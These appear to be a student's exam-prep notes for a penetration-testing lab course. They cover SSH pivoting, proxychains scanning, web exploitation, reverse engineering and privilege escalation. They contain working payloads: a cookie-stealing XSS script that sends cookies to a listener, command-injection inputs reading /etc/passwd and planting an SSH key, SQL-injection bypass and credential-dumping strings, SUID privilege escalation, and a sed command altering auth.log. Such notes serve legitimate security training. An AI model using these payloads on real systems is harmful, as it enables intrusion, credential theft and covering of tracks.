## 3. Script Locations

- `/usr/share/nmap/scripts`

---

## 4. Control Sockets & Recon Steps

### 1. Authenticate to Jumpbox & Setup Multiplexing Socket

```bash
ssh -MS /tmp/jump student@<jmp or next ip>
```
- The initial tunnel must stay up.

### 2. Ping Sweep (Check which boxes are up)

```bash
for i in {97..126}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
```

### 3. Dynamic Tunnel

```bash
ssh -S /tmp/jump jump -O forward -D950
```

### 4. Verify Sockets

```bash
ss -antlp
```

### 5. Proxychains for Scanning

- **Nmap scan:**
  ```bash
  proxychains nmap <ip>
  ```
- **Banner grabbing:**
  ```bash
  proxychains nc <ip> <port>
  ```

### 6. Forward Tunnel

```bash
ssh -S /tmp/jump jump -O forward -L 1111:<next ip>:<port>
ssh -MS /tmp/jump -p 1111 usr@localhost
```

- After this, cancel the old dynamic tunnel and create a new one.

### 7. Cancel Tunnel

```bash
ssh -S /tmp/jump jump -O cancel -L 1111:<next ip>:<port>
```

---

## 5. Web Exploitation Day 1

### HTTP Methods

- Most important: `GET` and `POST`

### XSS Script Example

```html
<script>alert('XSS');</script>
```

### Path Traversal

- Try `../../` on the webpage and look for `/etc/passwd`.

### Command Injection Example

```php
<script>system("ping -c 1".$_GET["ip"]);</script>
; cat /etc/passwd
```

### Useful HTTP Nmap Script

```bash
proxychains nmap -Pn -T5 -sT -p 80 --script http-enum.nse 10.208.50.42
```

### Steps After Initial Enumeration

1. In Firefox, visit: `127.0.0.1:1111/robots.txt`
2. Visit: `127.0.0.1:1111/java`
3. Use F12 for developer tools as needed.
4. For button prompts on websites, try commands like `; whoami`.
5. For POST/GET methods with a button, use path traversal: `../../../../../../../etc/passwd`
6. Steal cookies:
   ```html
   <script>document.location="http://127.0.0.1:42070/?username="+document.cookie;</script>
   ```
7. For SSH key storage:
   ```bash
   mkdir /var/ww/.ssh
   ; ls -la /var/ww
   ```
8. Generate SSH key (on your machine):
   ```bash
   ssh-keygen -t rsa
   cat ~/.ssh/id_rsa.pub
   ```
9. Inject your key:
   ```bash
   ; echo "<your-key>" > /var/ww/.ssh/authorized_keys
   ```
10. Forward port for SSH:
    ```bash
    ssh -S /tmp/jump jump -O forward -L2222:10.208.50.42:22
    ssh ww-data@localhost -p2222
    ```

---

## 6. Web Exploitation Day 2 (SQL)

### SQL Commands

- **SELECT:** Extracts data from a database  
- **UNION:** Combines result-set of two or more SELECT statements

#### MySQL Usage

```sql
mysql
show databases;
use information_schema;
show tables;
show tables from session;
SELECT * FROM session.car;
use <database>;
describe car;
```

#### Demo POST Method

- SSH:
  ```bash
  ssh -MS /tmp/demo demo1@10.50.13.16
  ```
- In Firefox: go to `127.0.0.1:1111`
  - On login screen, use `'OR 1='1` for username and password.
  - Inspect → Network → POST → Request → Raw
  - Example request:
    ```
    x.x.x.x/login.php?username='OR 1='1&password=OR 1='1
    ```
  - Inspect the page source.

#### SQL Injection with GET Method

1. Insert truth statement in vulnerable field:
   ```
   'OR'1='1
   ```
2. Identify number of columns:
   ```
   'UNION SELECT 1,2,3 #
   ```
   - Increase numbers if errors occur.
3. Use "Golden Statement":
   ```
   'UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns #
   ```
4. Extract credentials:
   ```
   'UNION SELECT username,2,passwd,4,5 FROM session.userinfo #
   ```

#### GET Method with Select Bar

1. Add condition after selection number:
   ```
   http://127.0.0.1:1111/uniondemo.php?Selection=4 OR 1=1
   ```
2. Identify number of columns:
   ```
   selection=4 UNION SELECT 1,2,3
   ```
3. Extract table/column info:
   ```
   UNION SELECT table_schema,table_name,column_name FROM information_schema.columns
   ```
4. Extract credentials:
   ```
   UNION SELECT username,passwd,2 FROM session.userinfo
   ```

---

## 7. Reverse Engineering & Exploit Development

### Assembly Commands

| Command | Description                                       |
|---------|---------------------------------------------------|
| MOV     | Move source to destination                        |
| PUSH    | Push source onto stack                            |
| POP     | Pop top of stack to destination                   |
| INC     | Increment source by 1                             |
| DEC     | Decrement source by 1                             |
| ADD     | Add source to destination                         |
| SUB     | Subtract source from destination                  |
| CMP     | Compare 2 values; ZeroFlag set if equal           |
| JMP     | Jump to specified location                        |
| JLE     | Jump if less than or equal                        |
| JE      | Jump if equal                                     |

### Static Analysis

- **DOS mode**: Windows executable; **ELF**: Linux executable
- Use `strings.exe` to look for clues:
  ```bash
  strings.exe -a -nobanner <filepath> | findstr /i success
  strings.exe -a -n 7 -nobanner .\demo1_new.exe
  strings.exe -a -nobanner .\demo1_new.exe | select -First 10
  ```

### Behavioral Analysis

- Run the program with expected input after code analysis.

### Disassembly

- Use Ghidra:
  - File → New Project → Import File
  - Search for strings, double-click function (e.g., "FUN") to decompile
  - Use pseudo code to walk back from desired end state ("success")
  - Right-click hex values to convert to decimal

### Patching

- Find instruction to change → right-click → patch instruction
- File → Export Program (format: PE), save and run

### Common Commands

- SCP files:
  ```bash
  scp -r -P 2222 comrade@192.168.28.111:/var/www/html/consulting/public_html/longTermStorage /home/student
  scp -r student@10.50.129.215:/home/student/longTermStorage C:\Users\student
  ```

- SSH key setup:
  ```bash
  mkdir /var/www/.ssh
  ls -lisa /var/www
  ssh-keygen -t rsa
  cat ~/.ssh/id_rsa.pub
  echo "<KEY>" >> /var/www/.ssh/authorized_keys
  ```

- SSH tunnels and connections:
  ```bash
  ssh -MS /tmp/jump student@10.50.12.103 -L 41223:192.168.28.105:2222
  ssh comrade@localhost -p 41223 -D 9050
  ```

- Find and use stolen SSH keys from backups:
  ```bash
  scp -r -P 8668 www-data@localhost:/tmp/backup.tar.gz /home/student
tunnel to jmp
ssh -MS /tmp/jmp student@10.50.12.103

tunnel to the .100
ssh -S /tmp/jmp t1 -O forward -L 8779:192.168.28.100:2222

new master socket using the www-data
ssh -MS /tmp/jmp2 www-data@127.0.0.1 -p 8779

forward tunnel 
ssh -S /tmp/jmp2 jmmpi -O forward -L 8778:192.168.150.253:3201

localhost connection
ssh www-data@localhost -p 8779

intra net tunnel make sure you have the ssh 
ssh -i /home/student/skey -MS /tmp/jmp3 comrade@localhost -p 8778

dynamic using new port
ssh -S /tmp/jmp3 dyno -O forward -D9050

connection to the rdp port
proxychains xfreerdp /u:comrade /p:StudentMidwayPassword /v:192.168.28.9 +clipboard




  ```

### Privilege Escalation (Linux)

- View sudoers:
  ```bash
  cat /etc/sudoers
  sudo !!       # Rerun last command as sudo
  sudo -l       # Show available sudo commands
  find / -type f -perm /4000 -ls 2>/dev/null
  ./nice /bin/sh -p
  whoami
  echo $PATH
  sed -i 's/172\.16\.34\.4/192.168.1.103/g' auth.log
  ```

### Privilege Escalation (Windows)

- Search scheduled tasks:
  ```cmd
  schtasks /query /fo LIST /v
  ```
Test priority:
2 parts: 3 hours each.
SQL.
Part 1 closes out after 3 hours.
part 1: basic website
directory traversal
manipulation
command injection
ssh key masquerade
FUCKS EVERYONE:
calm down, read full question.

85% of it is linux based.

NOTES:
--------------------------------
####AUTHENTICATION BYPASS#####
'OR 1='1   $truth statement in username and password
Go to inspect > network (login so you get the post) > post > request > raw (radio button) > paste ?THERAWSTRING into google
x.x.x.x/login.php?username='OR 1='1&password=OR 1='1    ####put a ? after the php, and then paste the RAWSTRING directory after it.
x.x.x.x/login.php?username=%27OR+1%3D%271&passwd=%27OR+1%3D%271   ###Example of what it should look like
